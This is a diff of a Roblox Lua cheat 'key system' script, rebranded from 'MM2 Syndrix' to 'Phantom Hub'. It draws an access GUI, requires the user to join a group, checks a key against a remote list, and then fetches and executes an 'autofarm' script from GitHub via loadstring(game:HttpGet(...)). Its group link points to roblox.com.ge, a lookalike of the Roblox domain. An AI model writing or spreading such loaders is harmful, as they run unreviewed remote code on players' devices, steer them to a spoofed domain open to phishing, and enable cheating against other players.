@@ -1,79 +1,100 @@
--- ======================
--- MM2 KEY SYSTEM (READY)
--- ======================
+-- =========================
+-- PHANTOM HUB KEY SYSTEM
+-- =========================
 
 -- CONFIG
 local GROUP_ID = 7178088300
 local GROUP_LINK = "https://roblox.com.ge/communities/7178088300/"
 local KEY_URL = "https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/keys.txt"
 
+-- MAIN SCRIPT
+local MAIN_SCRIPT = "https://raw.githubusercontent.com/PhantomHub-ui/autofarm/refs/heads/main/lua"
+
 -- SERVICES
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- UI
-local gui = Instance.new("ScreenGui")
-gui.Name = "MM2KeySystem"
-gui.Parent = player:WaitForChild("PlayerGui")
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "PhantomKeySystem"
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.fromScale(0.36, 0.32)
-frame.Position = UDim2.fromScale(0.32, 0.34)
+frame.Size = UDim2.fromScale(0.36, 0.34)
+frame.Position = UDim2.fromScale(0.32, 0.33)
 frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
 frame.BorderSizePixel = 0
-
-local corner = Instance.new("UICorner", frame)
-corner.CornerRadius = UDim.new(0,12)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
 
 local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.fromScale(1, 0.2)
+title.Size = UDim2.fromScale(1, 0.18)
 title.BackgroundTransparency = 1
-title.Text = "MM2 Syndrix Key System"
+title.Text = "Phantom Hub Access"
 title.TextColor3 = Color3.new(1,1,1)
 title.TextScaled = true
 title.Font = Enum.Font.GothamBold
 
 local copyBtn = Instance.new("TextButton", frame)
-copyBtn.Size = UDim2.fromScale(0.9, 0.18)
-copyBtn.Position = UDim2.fromScale(0.05, 0.25)
-copyBtn.Text = "Copy Group Link"
-copyBtn.Font = Enum.Font.Gotham
+copyBtn.Size = UDim2.fromScale(0.9, 0.16)
+copyBtn.Position = UDim2.fromScale(0.05, 0.22)
+copyBtn.Text = "Copy Link"
 copyBtn.TextScaled = true
+copyBtn.Font = Enum.Font.Gotham
 
-local box = Instance.new("TextBox", frame)
-box.Size = UDim2.fromScale(0.9, 0.18)
-box.Position = UDim2.fromScale(0.05, 0.48)
-box.PlaceholderText = "Enter Key"
-box.Font = Enum.Font.Gotham
-box.TextScaled = true
-box.ClearTextOnFocus = false
+local status = Instance.new("TextLabel", frame)
+status.Size = UDim2.fromScale(0.9, 0.14)
+status.Position = UDim2.fromScale(0.05, 0.42)
+status.BackgroundTransparency = 1
+status.TextScaled = true
+status.Font = Enum.Font.GothamBold
+
+local keyBox = Instance.new("TextBox", frame)
+keyBox.Size = UDim2.fromScale(0.9, 0.14)
+keyBox.Position = UDim2.fromScale(0.05, 0.58)
+keyBox.PlaceholderText = "Enter Key"
+keyBox.TextScaled = true
+keyBox.Font = Enum.Font.Gotham
+keyBox.ClearTextOnFocus = false
 
 local verify = Instance.new("TextButton", frame)
-verify.Size = UDim2.fromScale(0.9, 0.18)
-verify.Position = UDim2.fromScale(0.05, 0.72)
-verify.Text = "Verify"
-verify.Font = Enum.Font.GothamBold
+verify.Size = UDim2.fromScale(0.9, 0.16)
+verify.Position = UDim2.fromScale(0.05, 0.76)
+verify.Text = "Verify Access"
 verify.TextScaled = true
+verify.Font = Enum.Font.GothamBold
 
--- COPY GROUP LINK
+-- COPY LINK
 copyBtn.MouseButton1Click:Connect(function()
     if setclipboard then
         setclipboard(GROUP_LINK)
         copyBtn.Text = "Link Copied!"
         task.wait(1.2)
-        copyBtn.Text = "Copy Group Link"
+        copyBtn.Text = "Copy Link"
+    end
+end)
+
+-- STATUS CHECK LOOP
+task.spawn(function()
+    while gui.Parent do
+        if player:IsInGroup(GROUP_ID) then
+            status.Text = "STATUS: JOINED ✅"
+            status.TextColor3 = Color3.fromRGB(0,255,0)
+        else
+            status.Text = "STATUS: NOT JOINED ❌"
+            status.TextColor3 = Color3.fromRGB(255,80,80)
+        end
+        task.wait(1.5)
     end
 end)
 
 -- KEY CHECK
-local function validKey(input)
+local function validKey(key)
     local ok, data = pcall(function()
         return game:HttpGet(KEY_URL)
     end)
     if not ok then return false end
 
     for k in string.gmatch(data, "[^\r\n]+") do
-        if input == k then
+        if key == k then
             return true
         end
     end
@@ -84,20 +105,17 @@ end
 verify.MouseButton1Click:Connect(function()
     if not player:IsInGroup(GROUP_ID) then
         verify.Text = "Join Group First"
-        task.wait(1.5)
-        verify.Text = "Verify"
+        task.wait(1.2)
+        verify.Text = "Verify Access"
         return
     end
 
-    if validKey(box.Text) then
+    if validKey(keyBox.Text) then
         gui:Destroy()
-
-        loadstring(game:HttpGet(
-            "https://raw.githubusercontent.com/GaG-2/mm2syndrix/refs/heads/main/madebysyndrixhub-mm2-v1-main-lua"
-        ))()
+        loadstring(game:HttpGet(MAIN_SCRIPT))()
     else
         verify.Text = "Invalid Key"
-        task.wait(1.5)
-        verify.Text = "Verify"
+        task.wait(1.2)
+        verify.Text = "Verify Access"
     end
 end)
